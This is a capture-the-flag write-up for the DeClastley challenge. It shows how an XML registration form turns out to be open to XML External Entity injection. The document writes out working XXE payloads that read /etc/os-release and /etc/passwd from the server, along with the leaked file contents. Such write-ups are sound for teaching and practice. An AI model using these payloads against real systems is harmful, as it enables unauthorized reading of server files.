# DeClastley

## Problem

Once you successfully complete this challenge you'll come across a string in this format: PlexTrac\_CTF=string. This is NOT the flag for points.

## Links

* https://declastley.plexhax.com

## Notes

### Hint

"Try taking a close look at the request and response in an intercepting proxy like burp community or zap proxy"

This hint was said on the CTF Discord.  Recommending to checkout the request and response with Burp, a tool able to act as a transparent proxy.  Messing around with Burb I was unfamiliar with the tool to know how best to use it to solve this challenge.

## Wireshare

My first idea based off the hint was that the server was sending multiple packets in response.  Some of these packets were not being handled correctly by the client but still were noticed so a tool like Wireshark would notice them.

Wireshare can't decrypt https message (with good reason), so it needs to be passed the certs.  An easy way to give wireshark access is to set the environmental variable `export SSLKEYLOGFILE=./tlslog.txt`.  In Wireshark in preferences, look up TLS protocol and at the bottom is a field "(Pre)-Master-Secret log filename".  Provide the path to the SSLKEYLOGFILE.  Then to prevent too much noise `curl` can be used.

```bash
curl --header "Content-Type: application/json" --data '<?xml version="1.0" encoding="UTF-8"?><root><name>kjhggkj</name><tel>gkgkhkjhjkhg</tel><email>email@email.com</email><password>iluhkljklhj</password></root>' https://declastley.plexhax.com/process.php
```

This would end up with no results though.  Looking at all requests and responses there is nothing special being sent.  

### XML Injection

The page https://declastley.plexhax.com leads to a form.  This form when submitted does a post request to /process.php and the body is a xml body.  Depending on any of the data put in the only field that has any response to change is the email field.  Changing the email changes the response saying what our email is.  The response header contains info about the server using PHP/8.0.12.  Along with this being XML I think the solution is try to inject a payload in the xml to get the flag.

One of the first results for googling xml payload to php server is, [XML External Entity (XXE) Injection Payload Cheatsheet](https://hackersonlineclub.com/xml-external-entity-xxe-injection-payload-cheatsheet/).  On this page is example of creating a variable and passing it, and telling that variable to show in one of the fields.  If we use that example in this challenge,

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
<root>
    <name>$xxe</name>
    <tel>adfasdf</tel>
    <email>&example;</email>
    <password>asdfasfd</password>
</root>
```

The response is, "Sorry, Doe is already registered!".  That might be indicative that this site is venerability to XXE Injection Payload.  Moving to an xml request that tries to view files on the machine.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/os-release"> ]>
<root>
    <name>$xxe</name>
    <tel>adfasdf</tel>
    <email>&ent;</email>
    <password>asdfasfd</password>
</root>
```

The response is,

```text
Sorry, NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.14.2
PRETTY_NAME="Alpine Linux v3.14"
HOME_URL="https://alpinelinux.org/"
BUG_REPORT_URL="https://bugs.alpinelinux.org/"
is already registered!
```

This shows that the server is definitely susceptible to this attack.  Tried to access the `/etc/shadow` file but that returned nothing.  Showing that the web app is not running as sudo.

Using the same exploit to show files on the system though shows that the flag is in the `/etc/passwd` file.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<root>
    <name>$xxe</name>
    <tel>adfasdf</tel>
    <email>&ent;</email>
    <password>asdfasfd</password>
</root>
```

The response,

```text
Sorry, root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
nginx:x:100:101:nginx:/var/lib/nginx:/sbin/nologin
garfunkle:x:1000:102::PlexTrac_CTF=siskin_liard:/bin/ash
is already registered!
```

The flag is shown near the bottom.

## Solution

This challenge is a form with an obvious php backed that takes an XML form.  A response header even shows that version of php is running.  With that knowledge a XML External Entity (XXE) Injection Payload can be attempted to see if access to files is possible.  Using the xml body,

```xml
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<root>
    <name>$xxe</name>
    <tel>adfasdf</tel>
    <email>&ent;</email>
    <password>asdfasfd</password>
</root>
```

The flag is found in the passwd file. The flag for this challenge is PlexTrac_CTF=siskin_liard

